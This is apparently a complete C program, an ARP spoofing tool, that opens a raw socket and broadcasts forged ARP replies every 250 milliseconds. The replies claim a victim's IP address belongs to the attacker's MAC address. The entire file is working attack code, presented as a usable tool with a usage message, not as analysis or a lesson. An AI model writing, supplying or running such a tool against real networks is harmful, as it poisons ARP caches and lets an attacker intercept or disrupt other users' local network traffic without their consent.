#include "myHead.h"

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)
int main(int argc, char **argv) {
    if(argc != 4) {
        printf("Usage sudo ./arp_spoof <target-ip> <your-mac> <interface>\n");
        exit(1);
    }

    int rsfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if(rsfd < 0) {
        perror("rsfd");
        exit(1);
    }


    char buff[NI_MAXHOST];
    struct sockaddr_ll device;
    struct ether_header *eth = (struct ether_header*)(buff);
    struct ether_arp *arph = (struct ether_arp*)(buff + sizeof(struct ether_header));
    
    //initialize arp header
    //attackers mac (source mac)
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arph->arp_sha[0],
      (unsigned int *) &arph->arp_sha[1],
      (unsigned int *) &arph->arp_sha[2],
      (unsigned int *) &arph->arp_sha[3],
      (unsigned int *) &arph->arp_sha[4],
      (unsigned int *) &arph->arp_sha[5]);
    
    //victim ip (source ip)
    sscanf(argv[1], "%d.%d.%d.%d", (int *) &arph->arp_spa[0],
                           (int *) &arph->arp_spa[1],
                           (int *) &arph->arp_spa[2],
                           (int *) &arph->arp_spa[3]);
    
    arph->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  //Format of hardware address
    arph->ea_hdr.ar_pro = htons(ETH_P_IP);   //Format of protocol address.
    arph->ea_hdr.ar_hln = ETH_ALEN;    //Length of hardware address.
    arph->ea_hdr.ar_pln = 4;      //Length of protocol address.
    arph->ea_hdr.ar_op = htons(ARPOP_REPLY);  //ARP operation : REPLY
    memset(arph->arp_tha, 0xFF, ETH_ALEN);   //Target hardware address.
    memset(arph->arp_tpa, 0, 4);    //Target protocol address.

    //initialize ethernet header
    memset(eth->ether_dhost, 0xFF, ETH_ALEN);
    memcpy(eth->ether_shost, arph->arp_sha, ETH_ALEN);
    eth->ether_type = htons(ETH_P_ARP);

    //initialze interface address
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(argv[3]);  //Interface number 
    device.sll_family = AF_PACKET;     
    memcpy(device.sll_addr, arph->arp_sha, ETH_ALEN); //Physical layer address
    device.sll_halen = htons(ETH_ALEN);    //Length of address

    printf("Press Ctrl+C to stop \n");
    while (1) {
        //printf("Broadcasting on %s: %s is at %s\n", argv[3], argv[1], argv[2]);
        sendto(rsfd, buff, PACKET_LEN, 0, (struct sockaddr *) &device, sizeof(device));
        msleep(250);
    }
    return 0;

}
